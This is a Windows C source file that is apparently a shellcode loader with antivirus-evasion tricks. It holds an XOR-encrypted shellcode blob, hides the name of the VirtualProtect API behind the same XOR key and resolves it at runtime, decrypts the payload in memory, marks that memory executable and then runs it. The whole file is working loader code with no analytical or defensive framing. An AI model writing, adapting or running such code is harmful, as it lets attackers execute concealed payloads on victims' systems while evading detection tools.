#include <stdio.h>
#include <windows.h>

#define KEY "meow"
//pointer to Virtual Protect method
typedef BOOL (WINAPI * pVP)(
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD flNewProtect,
    PDWORD lpflOldProtect
);
char encrypted_shellcode[] = {
    "\x91\x8d\xed\x77\x6d\x65\x0f\xfe\x88\x54\xaf\x13\xe6"
    "\x35\x5f\xfc\x3f\x69\xe4\x25\x79\xee\x1d\x5f\x62\xd2"
    "\x25\x51\x5c\x9a\xc3\x4b\x0c\x19\x6d\x5b\x4d\xa4\xa0"
    "\x7a\x6c\xa2\x8d\x85\x3f\x32\xe4\x25\x7d\xee\x25\x4b"
    "\xe6\x29\x7e\x0f\x8e\x2d\x6e\xa6\x3c\xee\x36\x57\x6c"
    "\xb6\xe4\x3e\x75\x86\x55\x3e\xe6\x51\xe4\x76\xbb\x54"
    "\x90\xdb\xac\xaa\x62\x76\xaa\x5d\x8f\x02\x9b\x66\x12"
    "\x8f\x56\x18\x4b\x02\x89\x3d\xe4\x2f\x49\x64\xbc\x11"
    "\xe6\x69\x24\xfc\x35\x79\x6e\xa4\xe6\x61\xe4\x76\xbd"
    "\xec\x2b\x53\x49\x3e\x34\x16\x34\x3f\x3e\x88\x8d\x3a"
    "\x30\x2d\xe6\x77\x84\xfa\x30\x0f\x6e\xfa\xe8\xd7\x6f"
    "\x77\x6d\x35\x07\x46\xe6\x0a\xe8\x88\xb8\xde\x9f\xc2"
    "\xcf\x33\x07\xd1\xf8\xd8\xf2\x88\xb8\x59\x69\x0b\x67"
    "\xe5\x94\x97\x18\x60\xd4\x30\x7e\x17\x00\x1d\x6d\x36"
    "\x90\xa2\x0e\x04\x03\x14\x43\x00\x17\x12\x6d"
};
void XOR(char *data, size_t data_len, char *key, size_t key_len){
    int j = 0;
    for (int i = 0;i<data_len;i++){
        data[i] = data[i] ^ key[j];
        j = (j + 1) % key_len;
    }
}
pVP getVP_Address(){
    //Xor encrypted name of VirtualProtect
    unsigned char cVP[] = { 0x3b, 0xc, 0x1d, 0x3, 0x18, 0x4, 0x3, 0x27, 0x1f, 0xa, 0x1b, 0x12, 0xe, 0x11 , 0x00};
    //Exclude null terminator, because every string must be null terminated
    XOR(cVP, sizeof(cVP)-1, KEY, strlen(KEY));
    //Get module handle to kernel32.dll
    HMODULE hK32 = GetModuleHandle(TEXT("kernel32.dll"));
    //Get address of virtual protect to custom specified type
    return (pVP)GetProcAddress(hK32, (LPCSTR)(cVP));
}
void decryptShellcode(){
    XOR(encrypted_shellcode, sizeof(encrypted_shellcode)-1, KEY, strlen(KEY));
}
int main(){
    DWORD oldProtect;
    pVP myVP = getVP_Address();

    decryptShellcode();

    myVP(encrypted_shellcode, sizeof(encrypted_shellcode), PAGE_EXECUTE_READ, &oldProtect);
    int (*shellcodefunc)() = (int(*)())(void*)encrypted_shellcode;
    shellcodefunc();
}